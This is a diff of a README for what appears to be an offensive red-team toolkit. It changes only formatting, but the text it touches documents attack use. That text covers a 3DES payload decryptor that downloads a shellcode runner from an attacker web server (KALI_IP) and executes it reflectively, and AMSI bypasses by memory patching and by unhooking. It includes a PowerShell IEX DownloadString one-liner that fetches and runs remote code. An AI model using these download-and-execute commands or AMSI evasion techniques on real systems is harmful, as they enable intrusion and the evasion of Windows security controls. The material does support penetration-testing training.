@@ -31,11 +31,17 @@ The 3DES payloads are located under payloads/3DES/ directory. There are two payl
 
 #### Method 1
 The executable **des_decryptor.exe** is downloading the file from your Web server and executes it reflectively.
-```cmd> des_decryptor.exe http://KALI_IP/<SHELLCODE_RUNNER>```
+
+```
+cmd> des_decryptor.exe http://KALI_IP/<SHELLCODE_RUNNER>
+```
 
 #### Method 2
 The executable embedds a shellcode runner. You can run it without providing any commands. 
-```cmd> des_decryptor_embedded.exe```
+
+```
+cmd> des_decryptor_embedded.exe
+```
 
 ----
 
@@ -44,7 +50,7 @@ There are two methods to bypass AMSI:
 - Patching 
 - Unhooking
 
-##### Method 1
+#### Method 1
 Patching template is what Offensive-Security teaches in OSEP with some small changes. The execution of 1st method (Patching) is straight forward and uses well-known methodologies.
 
 ```
@@ -61,7 +67,7 @@ $buf = [Byte[]] (0x48,0x31,0xC0)
 powershell -nop -exec bypass -c IEX((New-Object Net.WebClient).DownloadString('http://<IP>/shellcode_runner.html')); 
 ``` 
 
-##### Method 2
+#### Method 2
 To unhook AMSI, I've used the project by jfmaes - AmsiHooker (https://github.com/jfmaes/AmsiHooker) and I permfored some small changes. When AmsiHooker executable will launched, it will download the Shellcode Runner from your web server and it will reflectively execute it.
 
 **Steps**
